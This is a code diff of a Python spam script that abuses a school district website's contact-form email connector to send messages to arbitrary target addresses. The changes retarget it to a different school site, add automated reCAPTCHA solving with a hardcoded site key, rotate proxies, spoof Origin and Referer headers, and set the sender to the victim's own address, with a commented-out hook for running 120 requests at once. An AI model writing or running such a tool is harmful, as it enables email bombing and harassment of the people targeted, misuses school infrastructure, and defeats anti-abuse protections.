@@ -1,3 +1,4 @@
+import uuid
 from datetime import datetime
 from os.path import basename
 
@@ -14,8 +15,8 @@ def get_password(s, password, timestamp):
         'AjaxAuthToken': '70f906cfaa4b4e96b7def8e2927ab8bc',
         'Connection': 'keep-alive',
         'Content-Type': 'application/json; charset=UTF-8',
-        'Origin': 'https://ridgeview.eurekausd.org',
-        'Referer': 'https://ridgeview.eurekausd.org/',
+        'Origin': 'http://willowoaks.ravenswoodschools.org',
+        'Referer': 'http://willowoaks.ravenswoodschools.org/',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'cross-site',
@@ -38,15 +39,15 @@ def get_password(s, password, timestamp):
     return response
 
 
-def post(s, password, timestamp, target, text):
+def post(s, password, timestamp, captcha, target, text, guid=str(uuid.uuid4()).replace('-', '')):
     headers = {
         'Accept': 'application/json, text/javascript, */*; q=0.01',
         'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
         'AjaxAuthToken': '70f906cfaa4b4e96b7def8e2927ab8bc',
         'Connection': 'keep-alive',
         'Content-Type': 'application/json; charset=UTF-8',
-        'Origin': 'https://ridgeview.eurekausd.org',
-        'Referer': 'https://ridgeview.eurekausd.org/',
+        'Origin': 'http://willowoaks.ravenswoodschools.org',
+        'Referer': 'http://willowoaks.ravenswoodschools.org/',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'cross-site',
@@ -57,23 +58,29 @@ def post(s, password, timestamp, target, text):
     }
 
     params = {
-        'timestamp': str(timestamp),
+        'timestamp': timestamp,
     }
+
     json_data = {
         'Id': -1,
         'ToEmail': target,
-        'ToName': 'R.J. Peterson',
-        'Url': 'https://ridgeview.eurekausd.org/subsites/Radford-Peterson/Rad-Peterson/Contact-Mr--Peterson/',
+        'ToName': 'Guadalupe Maciel',
+        'Url': 'http://willowoaks.ravenswoodschools.org/Contact/index.html',
         'FromEmail': target,
-        'FromName': 'name',
+        'FromName': text,
         'EmailReceipt': True,
         'Subject': text,
         'Message': text,
-        'Password': password,
+        'Password': '{"Password": %s, "Token": %s, "Guid": %s}' % (password, captcha, guid),
     }
 
-    response = s.put('https://email.catapultcms.com/Connector/Email', params=params, headers=headers, json=json_data)
+    response = s.put('https://email.catapultcms.com/Connector/Email', params=params, headers=headers,
+                     json=json_data)
     return response
+
+
+googlekey = '6Ldnn3skAAAAAIOP5uc0mx97rYGRuRUgtJK3l33E'
+pageurl = 'http://willowoaks.ravenswoodschools.org/Contact/index.html'
 
 
 class ConcreteSpam(Spam):
@@ -84,13 +91,17 @@ class ConcreteSpam(Spam):
         s.proxies = self.get_proxies()
         password = module.generate_text(32)
         timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
+        cap = self.solve_captcha(pageurl=pageurl, googlekey=googlekey, version='v3')
+        if not cap:
+            return
         get_password(s, password, timestamp)
-        post_resp = post(s, password, timestamp, target, self.get_text())
+        post_resp = post(s, password, timestamp, cap, target, 'test request')
+        print(post_resp.text)
         return post_resp
 
 
 def main():
-    spam = ConcreteSpam(basename(__file__)[:-3], 'Email Sent', target_pool_name='g11mp2')
+    spam = ConcreteSpam(basename(__file__)[:-3], 'Email Sent')
     res = spam.send_post()
     # if res:
     #     spam.run_concurrently(120)
